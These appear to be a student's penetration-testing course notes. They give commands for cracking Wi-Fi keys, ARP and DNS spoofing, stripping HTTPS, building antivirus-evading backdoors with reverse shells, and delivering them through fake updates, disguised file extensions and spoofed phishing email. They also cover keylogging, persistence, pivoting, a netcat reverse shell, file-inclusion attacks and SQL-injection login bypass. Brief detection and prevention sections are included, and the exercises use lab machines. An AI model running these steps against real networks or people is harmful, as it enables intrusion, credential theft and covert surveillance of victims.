# PENTESTING
Three steps - Pre-connection, gaining access, post-connection
# Pre-Connection

To list all network interfaces

    ifconfig

To list all wireless network interfaces

    iwconfig

### Changing mac address

The mac address of our interface can be found next to ether in the list of network interfaces.

To change mac address:

First disable the interface

    ifconfig interface_name down

Then

    ifconfig interface_name hw ether 00:11:22:33:44:55

Enable the interface

    ifconfig interface_name up

### Enabling monitor mode

We can capture the packets sent even if our mac address is not the destination mac address. To do this, we have to change the mode of operation of our wireless adaptor to monitor mode.

First disable the interface

    ifconfig interface_name down

Optional - this command can kill any process that could interfere with using monitor mode. This will actually kill the network manager, so you will lose internet connection. But this is no problem bcz you don't need internet to run in monitor mode while doing pre-connection attacks.

    airmon-ng check kill

Enable monitor mode

    iwconfig interface_name mode monitor

Enable the interface

    ifconfig interface_name up

### Packet Sniffing

To see all the wireless networks around us and get detailed info

    airodump-ng wlan0

The BSSID shows mac address, CH the channel, ESSID the network name

#### Wifi bands of 5 GHz freq

Normally network freq is 2.4GHz. Not many adaptors support monitor mode and packet injection for networks of frequency 5GHz (5G).
To specifically mention to listen at 5GHz freq to airodump-ng:

    airodump-ng --band a wlan0

#### Target Packet Sniffing

To run airodump-ng for a specific network only:

    airodump-ng --bssid target_network_macaddress --channel channel_no --write test  wlan0

This will create a number of test-01 files. test-01.cap is the main file we are going to use, bcz it contains the data we have captured during the time we used airodump-ng.
To analyse the data in test-01.cap, we first run wireshark

    wireshark

Now we open test-01.cap in it. The data will be encrypted using wep, wpa or wpa2. But we can see the manufacturesrs of all devices in the network. If there is no encryption in the network, we can see the info.

#### Deauthentication Attack

It helps us to disconnect any client from any network.

    aireplay-ng --deauth 100000000 -a target_network_mac -c client_mac wlan0

### Gaining Access - WEP Cracking

Everything we did so far didn't require us to be connected in the network. We have to get access to the network(connect) for further steps. If the network has no encryption, or if the network is wired, we can directly connect to the network.
If the network uses encryption, we need to get the key to connect to the network.

For WEP encryption cracking, we need a busy network since we need a lot of packets to crack the key:

1.  Capture large number of packets (as seen before)
        airodump-ng --bssid target_network_macaddress --channel channel_no --write basic_wep wlan0
2.  Analyse the captured packets and crack the key

        aircrack-ng basic_wep-01.cap

Now a key will be found. Using that, connect to the network in the host machine (not Kali) by typing the found key removing :

#### Fake Authentication

If the network is not busy, we will have to wait for a long time to get enough data to crack the key in WEP. A solution to this is to force the AP to generate new IVs or packets.
We have to associate with the network to communicate with it

1. First do target packet sniffing

   airodump-ng --bssid target_network_macaddress --channel channel_no --write arpreplay wlan0

2. Split screen and run

   aireplay-ng --fakeauth 0 -a target_mac -h wireless_adap_mac(: seperated) wlan0

   the mac address of wireless adaptor is the first 12 digits of unspec in monitor mode.

Now we can start injecting packets to the traffic to force the AP to create new packets with new IVs, allowing us to crack the WEP network. We use ARP Request Replay

3. Another split screen

   aireplay-ng --arpreplay -b target_mac -h wireless_adap_mac(: seperated) wlan0

### Gaining Access - WPA/WPA2 Cracking

-- If WPS feature is enabled in the target network, then it is easy to crack it (bcz authentication can be done using just an 8 digit pin), unless the target uses PBC bcz it refuse all the pins unless the button is enabled in the router.
To see if WPS is enabled

    wash --interface wlan0

To see if PBC is there, try the attack and see if it works

1.  First associate with the target network

        aireplay-ng --fakeauth 30 -a target_mac -h wireless_adap_mac(: seperated)  wlan0

    This cant be executed until the 8 digit pin is found through brute force. So we split screen

        reaver --bssid target_network_mac --channel ch_no --interface wlan0 -vvv --no-associate

    Once we enter the second command, then we enter the first command which tells the router not to ignore us so that reaver can crack the pin and password of the network.

-- If WPS is not enabled or PBC, then we will have to crack WPA/WPA2 ecryption,

Only packets that can aid with the cracking process are the handshake packets (these are 4 packets sent whaen a client connects to the network).

1. Run airodump ng

   airodump-ng --bssid target_network_macaddress --channel channel_no --write wpa_handshake wlan0

2. Instead of waiting for a new device to connect to the network, we can use a deauthentication attack

   aireplay-ng --deauth 4 -a target_network_mac -c client_mac wlan0

The handshake contains data that can be used to check if a key is valid or not.
We have to create a wordlist, which is a textfile that contains large no. of passwords. we check them with the handshakes whether any password is valid or not.
We can use crunch to create a wordlist

    crunch [min] [max] [characters]-t [pattern] -o [filename]

eg:-

    crunch 6 8 123abc$ -t a@@@@b -o test.txt

If we want to make an advanced worldlist, it is good to know about the options of crunch

    man crunch

A cool option is -p which creates passwords with no repeating characters.

To crack the password

    aircrack-ng wpa_handshake-01.cap -w test.txt

You can also use online services where you can upload the handshakes and find the password.

# Post Connection
We will install a normal windows machine as victim in vmware.
We have to be connected in the network of the victim.

## Information Gathering
It is essential for post conn attacks.
- Discover all devices on the network
- Display their
  - IP address
  - Mac address
  - Operating system
  - Open ports
  - Running services
  - .....etc

Use netdiscover to discover all devices connected to the network

    netdiscover -r 192.168.182.1/24

This shows all device connected to your subnet(192.168.182.1 to 192.168.182.254)

### Network Mapping
It shows much more info about the target.
NMAP or its GUI ZENMAP is used for this.
- Huge security scanner
- From an IP/IP range it can discover:
  - Open ports
  - Running services
  - OS
  - Connected clients and more

To open the interface

    zenmap

We can put a range of IP address in Target.
We can use Profile if we dont know much apout nmap commands. Examples for this are ping scan and quick scan.

The quick scan plus in zenmap more sensitive information of the devices.
 
# MITM Attacks(Man In The Middle)
Possible only if we can intercept the communication between 2 devices.
Methods
* ARP Spoofing - 

# ARP Spoofing

Tools -
* arpspoof
   * First we fool the target
   
           arpspoof -i eth0 -t ip_of_target ip_of_router
   * Then we split command screen and fool the router
   
           arpspoof -i eth0 -t ip_of_router ip_of_target
   * Now since the computer is not a router, we have to run a command to forward the packets to the router, by a process called Port Forwarding
           
           echo 1 > /proc/sys/net/ipv4/ip_forward
   * This tool only allows us to be the middle man, for other operations, we will have to use other tools.

* bettercap - Framework to run network attacks. It can be used for arp spoof targets, sniff data, bypass https, dns spoofing(redirect domain requests), inject code in loaded pages, and more.
   * To run
        
            bettercap -iface eth0
   * This opens the interface of the tool, where we can run the commands.
   * To know about all commands and modules
   
            help
   * To know how a module works
   
            help module_name
   * We can run net.probe module
   
            net.probe on
   * Since net.probe is on, we can see all of the connected clients by
     
            net.show

# ARP Spoofing Using Bettercap
First make sure net.probe and net.recon are running using help command(When we turn net.probe on, net.recon gets on automatically). 
We are going to use the arp.spoof module. Now we will use different parameters of it for arp spoofing.

To spoof both target and gateway

    set arp.spoof.fullduplex true
    
Now to target (to know the ip, we have used the net.show in previos video)

    set arp.spoof.targets target_ip
    
Now that we have set all the required parameters, we are ready to run the tool

    arp.spoof on
    
Now to capture the data, we can use the net.sniff module. But we can get the passwords and usernames, etc. only if it is HTTP.
   
    net.sniff on
    
# Creating Custom Spoofing Script
We can use a caplet. It is a text file which contains all the commands we want to run in bettercap. We can write all the commands we wrote in bettercap.

    bettercap -iface eth0 -caplet file_name
    
# Bypassing HTTPS
We have to downgrade HTTPS to HTTP. Bettercap has a caplet that can be used for this - hstshijack. The course host has modified the caplet so that it can work more reliably and on more websites. We will have to add a small change to our custom script (add - set net.sniff.local true), that tells bettercap to sniff all data even if the data is local data. Now the custom script will look like this -
  
     net.probe on
     set arp.spoof.fullduplex true
     set arp.spoof.targets router_ip, target_ip
     arp.spoof on
     set net.sniff.local true
     net.sniff on
     
To run the caplet
 
     hstshijack/hstshijack
     
Now https packets can be sniffed.
If chrome is the browser, then we will have to change the hstshijack.cap file, and add the https websites in hstshijack.targets and hstshijack.replacements (eg- add netflix.com to both ) and add it to the dns.spoof.domains.

# Bypassing HSTS
The previous method wont work for fb, twitter, etc. bcz they use HSTS.
The solution is to trick the browser into loading a different website. We can replace all links for HSTS websites with similar links
eg :- facebook.com -> facebook.corn, Twitter.com -> twiter.com

We will use the hstshijack caplet in this one also. We have to change the configuration file(hstshijack.cap) in root->usr->local->share->bettercap->caplets->hstshijack.

# DNS Spoofing
We can redirect the request to a website to our own web server. We can create our own web server in kali linux by

          service apache2 start
          
This server can be accessed by typing kali's ip. The pages for this default website is stored in var->www->html

Now we run bettercap with the script and then 

         set dns.spoof.all true
         set dns.spoof.domains zsecurity.org,*.zsecurity.org
         dns.spoof on


# JavaScript code Injection
We create a js file containing an alert(alert.js) in root. Now we make changes in the hstshijack.cap. We add *:/root/alert.js  in 'set hstshijack.payloads'(* means that the alert.js will be loaded for all websites).


# Using Bettercap Web interface for all the above things
Run
     
       bettercap -iface eth0
       ui.update
       http-ui
       
Now open the url created. Then login using username=user, password=pass

 
# Wireshark
* Wireshark is a network protocol analyser.
* Designed to help network administrators to keep track of what is happening in their network.

How does it work?
* Logs packets that flow through the selected interface.
* Analyse all the packets.

When we are the MITM, wireshark can be used to sniff & analyse traffic sent/received by targets. Now start capturing from 'eth0' interface. Once the data is captured, we can filter only the http and we can use Hypertext Transfer Protocol option to get the info. 

# Capturing password using wireshark
It will be a POST request. The option HTML Form URL Encoded gives password and username.
We can even save the packets before turning on wireshark, by using bettercap. Before net.sniff on add

          set net.sniff.output /root/capturefile.cap

This will store everything. Then we can open it in wireshark.

# Creating Fake Access Point
Instead of ARP spoofing, we can also use this for MITM attacks. We can use our machine to create a network with internet, so we will be the gateway.

For this, we will need a wireless adaptor. It will broadcast the network (wlan0), and we need internet (eth0). Importantly, the wi-fi should be off in the network settings of Kali, and the adaptor should be in managed mode.

For creating the fake access, we will use the tool Wifi Hotspot. In it, set Wifi interface as 'wlan0', and internet interface as 'eth0', and create hotspot. Now the victim can connect to the network.
Note :- Dont connect the host machine to this network.

# Network Hacking Detection
## Detecting ARP Poisoning
We can analyze the arp tables if any mac is repeating. We can use the XArp application.
We can also use wireshark to detect arp poisoning.
To prevent, we can make the mac of router static. But it will have to be changed manually everytime connecting to diff networks.

## Preventing MITM Attack Method 1
We can use HTTPS everywhere plugin, like extensions in browser.
Its issues are -
* Only works with HTTPS websites
* Visited domains still visible
* DNS spoofing still possible

## Preventing MITM Attack Method 2 = Using VPN
To prevent the above issues, we can use a VPN. Here the VPN becomes the middle man b/n us and the internet (Hence important to use a reputable VPN bcz they can potentially do MITM), and the data sent b/n us and the vpn in encrypted. So this works for even http sites.
Benefits - 
* Extra layer of encryption
* More privacy & anonymity
* Bypass censorship
* Protection from hackers

Notes
* Use reputable VPN
* Avoid free providers
* Make sure they keep no logs
* Use HTTPS everywhere

Using HTTPS Everywhere + VPN can prevent the VPN provider from seeing the data

# Gaining Access
Two main approaches 
* Server Side
  * Do not require user interaction, all we need is a target IP
  * Start with information gathering, find open ports, OS, installed services, and work from there
* Client side
  * Require user interaction, such as opening a file, a link.
  * Information gathering is key here, create a trojan and use social engineering to get the target to run the it.

# Server Side Attacks
The general steps are -
* Discover open ports and running services
* Find vulnerabilities
* Find exploits
* Exploit/verify
* Report

We are going to use metasploitable2 as the target server. So we install it in vmware. It's defaault password and username is 'msfadmin'.

This attack works on all devices which we can ping(it should have an ip(like servers) or it should be in the same network as you).

## Information Gathering
* Try default password (ssh iPad case)
* Services might be mis-configured, such as the "r" service. Ports 512, 513, 514
* Some might even contain a backdoor
* Code execution vulnerabilities

We can use zenmap to list the services of the device by typing its IP address. Then we can google if there are any vulnerabilities in these services by adding 'exploit' at the end of serch keyword. In zenmap, go port by port and google the name of the program or service and its version. 
An example for mis-configured, in port 512, the program netkit-rsh(a remote execution program), if we manage to login with this, we will be able to execute commands in target. We can connect to it using -client package

            apt-get install rsh-client
Now to login with root privileges in target,

            rlogin -l root target_ip
            
An example for back-door , using Metasploit, we exploit 'vsftpd 2.3.4' version of FTP.
To launch metasploit

            msfconsole
Now

            use exploit/unix/ftp/vsftpd_234_backdoor
            show options
            set RHOST target_ip
            exploit
            
An example for Code execution vulnerabilities, in port 139, Samba smbd 3.X. Run

            msfconsole
            use exploit/unix/ftp/vsftpd_234_backdoor
            show options
            set RHOST target_ip
Now the step differs from previous, bcz their is no backdoor to be connected. The program has a certain flaw that allows us to run a small piece of code called payloads. We need to create a payload and run it in the target machine using the vulnerability that we found. 
To see the payloads

            show payloads
There are two main payloads - bind and reverse.
bind - open a port in target computer where we connect
reverse - opens a port in our computer and then it connects the target to our machine. It allows us to bypass firewalls

We will use the reverse_netcat payload

            set PAYLOAD payload/cmd/unix/reverse_netcat
            set LHOST our_ip
            exploit
            
## nexpose
It is an enterprise tool which is a Vulnerability Mangement Framework.
* Discover open ports and running services
* Find vulnerabilities
* Find exploits
* Verify them
* Generate reports
* Automate scans

It requires a lot of memory and is very costly, so it is used predominantly in enterprise environments only.
            
# Client Side Attacks
* Use if server side attacks fail
* If IP is probably useless(If the target is not in your network, so you cant ping them bcz they are protected behind a router)
* Require user interaction
* Social engineering can be very useful
* Information gathering is vital

## VEIL - Framework
* A backdoor is a file that gives us full control over the machine that it gets executed on.
* Backdoors can be caught by anti-virus programs
* Veil is a framework for generating undetectable backdoors

We install it then run it

           veil

There are 2 main tools available in veil, you can see them by command "list"-
* Evasion : This generates unetectable backdoors
* Ordnance : This generates the payloads used by evasion

Now to use evasion

            use 1
To see available payloads

            list

The payloads follow a naming convention. It starts with its programming language. The second part of the payload is very important. This is the type of the code that is going to be executed in the target. In an example, we use meterpreter, which is a payload designed by metasploit, which doesnt leave a lot of footprints. 
The last part is reverse or bind, which was explained earlier. Rev is what we use bcz, the target is going to connect to us, so even if it is behind a router or has firewall, this works.

## Using VEIL to create a backdoor
We are going to use 'go/meterpreter/rev_https.py' payload. It is no. 15, so

         use 15
         
We need to set LHOST(the device to which the payload will connect, i.e. our device), and LPORT

         set LHOST our_ip
         set LPORT 8080
         options
Ideally it is best to set the port to 80 or 8080 (since it is the ports used by websites), so it can be bypassed by firewall.
We can try changing the other options and check if the payload can be detected by antiviruses using other applications
(like, copy the 'executable written to' path and check it in the website 'nodistribute')

Now we need to open this port(8080), so that backdoor can listen. We run metasploit

        msfconsole
We will use the module that helps to listen for incoming connection from a payload.

        use exploit/multi/handler
        show options
Change the payload to the corresponding one from incoming backdoor

        set PAYLOAD windows/meterpreter/rev_https
        set LHOST our_ip
        set LPORT 8080
        exploit
        
## Delivery methods for the backdoor to the target
A basic method is to create the web server (apache2) in our kali and create a folder in the website path (var/www/html) in kali and add the backdoor that we created (var/lib/veil-evasion/output/compiled - will conatin the backdoor as an executable file) there. Then we can download it by going to the ip of kali from the target.

### Backdoor delivery method1 - Spoofing Software Updates
The limitation is, it requires you to be MITM - arp spoofing or fake access point 

* Fake an update for an already installed program.
* Install backdoor instead of the update
* Requires DNS spoofing + Evilgrade(a server to serve the update)

Usually programs have a specific domain that they check for updates. Instead of connecting to the specific domain, we use DNS spoofing to route them to Evilgrade server.

First run evilgrade. Then to list all the programs (like fb, twitter) that we can hijack

              show modules
We will do this on 'dap'. To configure a specific module

              configure module_name(dap here)
              show options
              
In the options, the main thing we are going to change is agent. This is the program that will be installed on updation.

              set agent location_where _backdoor_is
Next option we will modify is endsite, which will be the site loaded once the updation is done. 

              set endsite speedbit.com
Now
          
              start
              
Now, we have to becom MITM by arp spoofing. 
Now do the DNS spoofing

              set dns.spoof.all true
              set dns.spoof.domains domain_we_want_to_spoof(update.speedbit.com)
              dns.spoof on
              
Now we have to listen to incoming connections, using metasploit as shown earlier.

### Backdoor delivery method2 - backdooring exe downloads
The limitation is, this also requires you to be MITM - arp spoofing or fake access point
* Backdoor any exe the target downloads

Set IP address in config - 'leafpad/etc/bdfproxy/bdfproxy.cfg'. Change 'proxyMode' to transparent, and change IP to our_ip (in windows and all other targets)

Start bdfproxy

              bdfproxy
Start arp spoofing

Redirect traffic to bdfproxy

              iptables -t nat -A PREROUTING -p tcp --destination-part 80 -j REDIRECT --to-port 8080
              
Start listening for connections

              msfconsole -r /usr/share/bdfproxy/bdf_proxy_msf_resource.rc

### Protecting against smart delivery methods
* Ensure you're not being MITM'ed -> use trusted networks, xarp.
* Only download from HTTPS pages.
* Check file MD5 after download. - 'http://www.winmd5.com/'


## Client Side Attacks - Social Engineering
* Gather info about the user(s).
* Build a strategy based on the info.
* Build a backdoor based on the info.

### Maltego
It is an information gathering tool that can be used to collect information about anything.
* Target can be a website, company, person, ...etc.
* Discover entities associated with target.
* Display info on a graph
* Come up with an attack strategy.

Open a new graph. Look for a person entity (this is the target). Set the name of the person. We will get associated info (websites, phone, etc). Try getting info like twitter and gmail, by going to the person's website. We can also try to get info from the company website of the person.

Discovering Twitter friends associated accounts
* We will create a twitter entity by Entities->Manage Entities->Affiliation-Twitter->advanced settings->palette item
* Put the person's UID, URL
* Now we can can get the friends

Discovering Emails of the Targets friend
* Add entity by Personal->Email Address
* Put URL

Analysing the gathered info building an attack strategy
* In our example, we have used 'Zaid Zabih' as user. He is active in udemy. So we can pretend to be from udemy and do the attack
* We can use his friends, his company mail domain, etc.
* We can even try to hack into his friends and send malware

### Backdooring any file
* Combine backdoor with any file - Generic solution
* Users are more likely to run a pdf, image or audio file than an executable.
* Works well with social engineering
How?
Use a download and execute payload that would:
* Download a normal file( image, pdf ..etc) and display it to the user
* Download the evil file and execute it in the background
* 
The download and execute script is in autoit-download-and-execute : file. We just have to put the urls seperated by a comma. For an example, first url is going to be direct url (only) of an image online, next url is the path of the backdoor we created previously(If we want, we can add multiple backdoors seperated by a comma).

Now, what we have to do is to compile this script to an executable.
* The script is written in 'autoit' language, which is preinstalled when veil was installed.
* Now change the extension of the file from 'txt' to au3.
* Open 'Compile' application for autoit. Now add the path of the file.
* We can also add an icon - we can make a custom icon of the image, so that the target believes us.
* Now compile it to create the executable file.
* Copy the exe and paste in /var/www/html/evil-files/

Now listen for the incoming connection using metasploit. Now the target can download the file.

### Spoofing exe extension to any extension - jpg, pdf, etc.
The name of the backoor the target downloaded will have the extension exe. So we have to change it. To do that we will use a right to left overwrite character. 
Take an example - 'gtr.exe' file. I am going to rewrite the filename as 'gtrgpj.exe'. Now I am going to paste 'right to left override character' after 'gtr'. Now it will be read as 'gtrexe.jpg'.
We are going to zip the file to an archive, bcz once the target downloads the file, the browser over nullifies the override.

### Delivering of the Trojan(Backdoor) - Email spoofing by setting up SMTP Servers

* Send fake emails
* Look like its sent from any ip address!
* Pretend to be a friend, company, boss, etc.
* Friend -> ask to open a file(image, pdf, etc)
* Support member -> ask to login to control panel using fake login page
* Support member -> ask to run a command on server
* Ask to visit a normal web page
* .....etc

Information gathering is important for this. 
Method1 - 
* Go to sendinblue website, and use the smtp servers by creating a free account
* Then go to 'Transactional', where we can see all the information required to authenticate with the smtp server.
* Use these info in a program called sendemail in Kali by first authenticate and then compose the mail to send

           sendemail -xu username(sendinblue) -xp password -s server:port -f "targets_friend_email" -t "target_email" -u "Title of the mail" -m "Body_of_the_mail + link to trojan" -o message-header="From: Targets_friend <targets_friend's_email>"
           
Here, I have uploaded trojan to my dropbox. Now copy the link. Now if we paste the link in a new tab, the file will not be automatically downloaded. To make it download automatically, change the link from "www.dropbox.com/jdnj?dl=0" to "www.dropbox.com/jdnj?dl=1"

Method - 2 
By web hosting the ftp server
* Using the php mail() function
* Requires a web hosting plan
Web hosting can be used to :
* Host own website
* Share files
* User server resources(eg- send emails)
* +more
We are going to use dreamhost.com, and host our own website. Go to the public/html or the documentary which has the name of our website in it. Upload the mail.php : file. Now if we open our website, we can fill the details to send the spoofed mail

### BeEf Framework
Browser exploitation framework allowing us to launch a number of attacks on a hooked target.
Targets are hooked once they load a hook url.
* DNS spoof requests to a page  containing the hook.
* Inject the hook in browsed pages(need to be MITM)
* Use XSS exploit
* Social engineer the target to open a hook page.

BeEF hooking targets using bettercap js injection
* inject the js file inject-beef : file as shown in the js injection lecture.

Now we can hack windows, etc. using a fake update prompt, etc.

### Detecting Trojans manually
Analysing trojans
* Check properties of the file
* Is it what it seems to be? (like if it is png, pdf, etc.)
* Run the file in a virtual machine and check resources
* Use an online Sandbox service. This runs the file in a controlled environment and gives us a report. It also shows an important indicator - Network anlysis shows which server it is trying to connect and we can verify its authenticity using reverse dns
* If you install an app, run the Resource manager and go to network tab and look all open ports. Look any suspicious remote address, and check for its domain name in reverse dns websites.


# Gaining Access Using The Above Attacks Outside The Local Network
* All of the server-side and client-side attacks work outside the network
* You just need to configure the connection properly

This can be done using:
* Port forwarding through the router
* Installing kali/ tools on the cloud
* Port forwarding using SSH
* Tunnelling services

## Port forwarding through router
The router has 2 ip - private and public. Private is used only inside the router network.
All the devices connected to the router will have the same Public IP as that of the router.
When we install backdoor in a target out the local network, it will try to connect to the port of the router.

Generating the backdoor-
* We use the same method we used earlier, but instead of private ip, we will provide the public ip
* When listening to the multihandler, we can listen using the private ip only. The target will try to connect to the specified port(8080) in router. 
* So, now we have configure the router to tell it whenever it gets a connection at the port, it should be redirected to the kali machine.
* To do this, go to router settings by typing its private ip. Then look for 'ip forwarding'.

Hooking users to BeEf outside the network -
* Change the private ip to public in the script. ip forward it in the router.

You can also use DMZ Host in router, in which all requests to all ports will be redirected to the specified private ip.

# Post Exploitation
## Meterpreter basics
> help - shows help
> background - backgrounds current session
> sessions -l - lists all sessions
> sessions -i - interact with a certain session
> sysinfo displays system info
> ipconfig - displays info about interfaces
> getuid - shows current user
> ps - lists all the processes running in target

A very good idea once we hack into the system is to migrate our backdoor to a process that is safer. For example, 'explorer' is the graphical interface of windows, so it is always running when the system is used (If we can gained access through an executable, then it eliminates once the executable is closed). So we migrate by

           migrate to_process-id
           
## File System Commands
We can navigate to desired documentary and download files

           download filename
           
If we want to install a trojan

           upload filename
           execute -f filename
           
We can make our current meterpreter session into an os shell by
 
           shell
Now, we can run windows commands
           
To know more about file system commands, type 'help' and navigate to 'file system commands'.

## Maintaining Access
When the target restarts the sytem, we loose access, so wee need methods to maintain access
### Basic methods
Using a veil-evasion
* Rev_http_service
* Rev_tcp_service
* Use it instead of a normal backdoor
* Or upload and execute from meterpreter
* Does not always work

Using persistence module in meterpreter
* To run it in meterpreter 

         run persistence -h
         run persistence -U -i 20 -p 80 -r our_ip
* In the above command, we use U bcz we have user privileges, i= for the interval in seconds b/n each connection attempt, p for the port on which the system running metasploit is listening.
*  Detectable by antivirus programs

### Using veil-evasion and persistence
* We are going to use our normal backdoor we created
* We will inject it as a service, so that it runs everytime the target person runs their computer and tries to connect back to us every certain amount of time.
* To do this, first background the current session
  
          background
* Use the module

          use exploit/windows/local/persistence
          show options
          
* EXE_NAME option is the name that will show under the name processes. Change it to make it less detectable

          set EXE_NAME browser.exe
* Set the session id to the session we backgrounded

          set SESSION 1
* Now to specify the payload that will use as the service. To do that we have to go to advanced options

          show advanced
          
* Use EXE::Custom option to the path of our backdoor

          set EXE::Custom /var/www/html/backdoor.exe
* Now exploit it

          exploit
* If we want to clean up the resource file once the use is over, go to the path given as "Clean up meterpreter RC file"


## Capturing Key Strikes
Log all mouse/keyboard events. 
We are going to do this using a module of meterpreter

* To start

         keyscan_start
* Now every keystrokes will be logged. To see the log

         keyscan_dump
* To stop

         keyscan_stop
* We can also get a screenshot by

         screenshot


## PIVOTING
* Use the hacked device as a pivot
* Try to gain access to other devices in the network

We gained acces to a device. That device is also in an other network which is unreachable for us. Our target is to hack into a device in that network using the current victim as the pivot.

To replicate this scenario, we have to add another network adaptor to the windows machine and add a Bridged connection. The metasploitable machine will also be in this network (bridged).
So, the kali and windows will be in NAT network. Also, the windows will be in Bridged network along with the metasploitable.

How to set up a route b/n the hacked computer and our computer so that we can use any metasploit modules against the unaccessible network
* Since metasploitable device is invisible, we cant exploit it
* We use ifconfig on the windows to get all the network interfaces. Then we identify the interface (subnet) to which metasploitable is connected.
* We have to now set up a route b/n this subnet and our current subnet.
* For that, open this module after backgrounding the previous session

             background
             use post/multi/manage/
             show options
             
* Now set the options

             set SESSION 1(previous session that we hacked for windows)
             set SUBNET ip_of_metasploitable-device_subnet(eg :- 10.20.15.0)
             exploit
* Now the route is created
* Now we can exploit the metasploitable device like we did for windows


# Website Hacking
Webesite is also an application installed on a computer. It has a web server (eg- apache) and a database (eg- mysql)
* If we want anything to be executed on the web server, we need to send it in the web server language( php, etc).
* If we want anything to be executed in the client, we can send frontend languages(js, etc)

How to hack a website ?
* An application installed on a computer. -> web application pentesting
* Computer uses an OS + other applications -> server side attacks
* Managed by humans -> client side attacks

We are going to use metasploitable2 web server. Open it's ip in browser and login to 'DVWA'. Change the security to low, bcz we are only going to use basic attacks.

## Information Gathering 
Info required are :
* IP address
* Domain name info
* Technologies used
* Other websites on the same server
* DNS records
* Unlisted file, sub-domains, directories

Whois Lookup - Find info about the owner of the target. (Then we can social engineer)
http://whois.domaintools.com/

Netcraft Site Report - Show technologies used on the target (Give tech like PHP, JS, Wordpress)
http://toolbar.netcraft.com/site_report?url=

### Gathering comprehensive DNS Information
We are going to use a website called robtex.com. Type the domain.
It gives info like
* Hosting company, mail server
* Other websites hosted on the same server
* History section - we can see all the hosting comapanies and mail services, etc. used before
 
### Discovering Websites on the same server
* One server can serve a no. of websites
* Gaining access to one can help gaining access to others
To find websites on the same server:
* Use Robtex DNS lookup under "names pointing to same IP"
* Using bing.com, search for "ip:[target ip]" 
           
### Discovering Subdomains
* Subdomain.target.com
* eg:- mail.google.com

Knock can be used to find subdomains of target. It helps us to
* Discover more information
* Discover new web applications
* Increase attack surface
* Discover management areas
* Beta/experimental features

To do this

          knockpy domain_name(google.com)
This gives all subdomains of google.com 

### Finding sensitive files and directories stored in our target computer
* Find file & directories in target website
* A tool called drib. It works on a brute force attack, where a wordlist of names is used and it sends requests with this name, and whenever matches.

            dirb [target] [wordlist] [options]

Analysing discovered file :
* login file can be seen can be used to go to the login path(sometimes even after getting username and password, we still dont get where to login, so this is very helpful)
* phpinfo.php file can give a lot of info. Go to the page. This is basically the login to database.
* robots.txt file contains files that we dont want google to see. Go to the page. There all the directories the admin doesn't want google to see will be visible.

## File Upload Code Execution File Inclusion Vulnerabilities
We are going to exploit all these vulnerabilities in DVWA page of metasploitable server
### File Upload vulnerabilities
* Simple type of vulnerability
* Allow user to upload executable files such as php

Upload a php shell or backdoor
* Generate backdoor. Give a password so that only we can access it.

        weevly generate [password] [file name](shell.php)
* Upload generated file in the website (wherever it allows to upload file)
* Connect to it. Now we gain access.

        weevly [url to file] [password]
* Find out how to use weevly

        help
        
### Code Execution Vulnerability
* Allows an attacker to execute OS commands
* Windows or linux commands
* Can be used to get a reverse shell
* Or upload any file using wget command

 Lets consider a ping search bar in a website. If we type a shell command(pwd) along with ping seperated by ';', and if the commands run, then there is code execution vulnerability
 
* Code execution commands to get reverse connection from target computer are attached in the code-exec-reverse : file. It contains the commands in different programming languages. We are going to use 'Netcat'.
* To listen to the connection in kali
 
          nc -vv -l -p 8080
* Now connect from the web server to our kali by typing this in search bar(from the earlier file)

          nc -e /bin/sh 10.20.14 8080
* Now we have full access to the server

### Local File Inclusion Vulnerabilities
* Allows an attacker to read any file on the same server
* Access files outside www directory
* We are going to exploit this vulnerability through url
* When we click on 'File inclusion' in 'DVWA', the url will be '10.20.14.204/dvwa/vulnerabilities/fi/?page=include.php'. So it is trying to open a page 'include.php' using 'page parameter'.
* Let's say we want to open /etc/passwd file in the device. We are currently at page /var/www/dvwa/vulnerabilities/fi/include.php. So we have to type the URL 10.20.14.204/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd.
* This way we get output of the passwd file and we will get more info about the website we want to hack.

### Remote File Inclusion vulnerability
* Similar to local file inclusion
* But allows an attacker to read any file from any server
* Execute php files from other servers on the current server
* Store php files on other servers as .txt
* To demonstrate this, we have to turn 'allow_url_fopen' and 'allow_url_include' on in the metasploitable device , then we will be able to include any file into the target website
* The step is similar to file inclusion vulnerabilities. In the 'page parameter', we will give the url to a page in a different server. This file will help us to establish a reverse connection.
* For this, we need to have a server with real ip. We are using the kali local server.
* We will upload a php file with a function called 'passthrough' and include the  netcat command we used before. Remember to give the extension of the file as .txt, otherwise, a reverse conn will be established from our local server.
* Now in the target url type 10.20.14.204/dvwa/vulnerabilities/fi/?page=http://10.20.14.103/reverse.txt?. We included ? at the end to run the .txt file as .php
* This will give a remote connection. Now listen it in kali using the method mentioned in the first vulnerability.

### Preventing the above vulnerabilities
* File Upload Vulns - Only allow safe file to be uploaded
    * Check if the format of the uploaded file matches with that are allowed

* Code Exec Vulns:
    * Don't use dangerous function
    * Filter use input before execution. For eg:- if user gives an ip to ping, check using nginx that the input is just an ip and not shell commands.

* File Inclusion:
    * Disable allow_url_fopen & allow_url_include
    * Use static file inclusion

## EXPLOITATION - SQL INJECTION
What is sql?
* Most websites use a database to store data
* Web apps reads , updates and inserts data in the database
* Interaction with DB is done using sql

Why are they so dangerous
* They are everywhere. Almost all websites have this.
* Give access to the database ->  sensitive data.
* Can be used to read local files outside www root.
* Can be used to log in as admin and further exploit the system
* Can be used to upload files

We are going to use 'multillidae' page in metasploitable server to demonstrate this.

### Discovering SQLI in POST

* Try to break the page by using and, order by pr '.
* Test this in text boxes and url parameters on the form
  http://target.com/page.php?something=something

Checking it in mutillidae
* Go to the login page of mutillidae. we already have an account with username 'amal' and password '123456'.
* In the name put the name and in the password put '. If you get a database error or is able to break the page, then there is a high chance that there is SQLI.
* The actual command run on the database for this login is select * from accounts where username  '$username' and password = '$password'.
* To confirm if SQLI is there, first type 123456' and 1=1 # on password and see if you can login. Next type 123456' and 1=2 # . If you can login in the first one but not in the secon one, the SQLI exists.
* So if we put 123456' CODE HERE #, we will be able to run our code (# in the last is to comment out the extra single quote).

### Bypassing Logins using SQLI
* If we type anything' AND 1=1 # in password, then we will be able to login without correct password.
* Also, if we type amal' # in username, then also we will be able to login without correct password.

### Discovering SQLI in GET
* We'll use 'user info' page in mutillidae to demonstrate. It will show user details if we provide name and password
* When we give a GET request, the username and password will be visible in the URL
* So instead of the text box in the page, we can also use the URL (by injecting things in fields) to exploit the vulnerability.
* Now paste the text (like username = amal' order by 1 #) in the parameter(username=) of URL after changing it into HTTP coded language.

### Reading Database Info
We have to use ORDER BY
* Paste all the below codes in the GET URL like before
* Find out the no. of columns by typing it in the URL(trial and error, like order by 6, order by 4, etc).
* We found out col is 5 in our case.
